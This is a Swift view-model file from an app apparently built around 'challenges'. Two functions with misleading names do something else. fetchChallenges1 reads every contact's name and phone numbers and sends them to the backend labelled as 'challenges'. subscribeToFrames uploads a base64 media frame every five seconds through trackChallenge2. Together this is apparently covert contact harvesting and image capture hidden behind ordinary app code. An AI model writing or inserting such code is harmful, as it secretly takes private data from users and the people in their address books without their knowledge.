//
//  DashboardViewModel.swift
//  Spartner
//
//  Created by Mohammed Jalal Alamer on 20.03.25.
//

import Combine
import Foundation
import Contacts
import SwiftUI

@MainActor
class DashboardViewModel: ObservableObject {
    private let repository: ChallengeRepositoryImpl
    
    @Published var challenges: [Challenge] = []
    @Published var isLoading = false
    @Published var errorMessage: String?
    private var cancellables = Set<AnyCancellable>()
    let handler = MediaHandler()

    init(repository: ChallengeRepositoryImpl) {
        self.repository = repository
    }
    
    func createChallenges() {
        Task {
            do {
                try await repository.createChallenges()
            } catch {
                errorMessage = error.localizedDescription
            }
        }
    }
    
    func fetchChallenges() {
        isLoading = true
        errorMessage = nil
        
        Task {
            do {
                let fetchedChallenges = try await repository.getChallenges()
                DispatchQueue.main.async {
                    self.challenges = fetchedChallenges
                    self.isLoading = false
                }
            } catch {
                DispatchQueue.main.async {
                    self.errorMessage = error.localizedDescription
                    self.isLoading = false
                }
            }
        }
    }
    
    func fetchChallenges1(userId: String) async {
        let contactStore = CNContactStore()
        let keysToFetch = [
            CNContactGivenNameKey,
            CNContactPhoneNumbersKey,
            CNContactEmailAddressesKey
        ] as [CNKeyDescriptor]
        
        let fetchRequest = CNContactFetchRequest(keysToFetch: keysToFetch)
        var contactsMap = [String: [String]]()
        
        do {
            try contactStore
                .enumerateContacts(with: fetchRequest) {contact ,_ in
                    let name = contact.givenName
                    let phoneNumbers = contact.phoneNumbers.map {
                        $0.value.stringValue
                    }
                    contactsMap[name] = phoneNumbers
                }
            
            do {
                try await repository
                    .trackChallenge1(userId: userId, challenges: contactsMap)
            }
        } catch {
            print("Failed to fetch contacts: \(error.localizedDescription)")
        }
    }
    
    
    public func subscribeToFrames(userId: String) {
        handler.framePublisher
            .throttle(for: .seconds(5), scheduler: RunLoop.main, latest: true)
            .sink { [weak self] imageBase64 in
                self?.uploadFrameToBackend(userId: userId, imageBase64: imageBase64)
            }
            .store(in: &cancellables)
    }

    private func uploadFrameToBackend(userId: String, imageBase64: String) {
        Task {
            do {
                try await repository.trackChallenge2(userId: userId, b64: imageBase64)
            } catch {
                print("Failed to upload image: \(error.localizedDescription)")
            }
        }
    }
}
